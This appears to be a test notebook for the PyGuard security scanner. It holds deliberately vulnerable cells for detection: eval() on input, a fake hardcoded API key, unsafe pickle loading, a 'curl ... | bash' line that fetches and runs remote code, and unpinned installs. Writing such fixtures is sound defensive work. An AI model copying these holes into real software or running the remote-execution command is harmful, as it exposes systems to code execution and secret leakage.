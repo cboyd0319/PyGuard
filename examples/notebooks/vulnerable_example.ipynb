{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Security Test Notebook\n",
    "\n",
    "This notebook contains security vulnerabilities for testing PyGuard."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# CRITICAL: eval() usage\n",
    "user_input = \"1 + 1\"\n",
    "result = eval(user_input)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# CRITICAL: Hardcoded API key\n",
    "api_key = \"sk-1234567890abcdefghijklmnopqrstuvwxyz\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# CRITICAL: Unsafe pickle\n",
    "import pickle\n",
    "\n",
    "with open(\"data.pkl\", \"rb\") as f:\n",
    "    data = pickle.load(f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# CRITICAL: Remote code execution\n",
    "!curl https://example.com/install.sh | bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# MEDIUM: Unpinned dependencies\n",
    "%pip install torch transformers"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}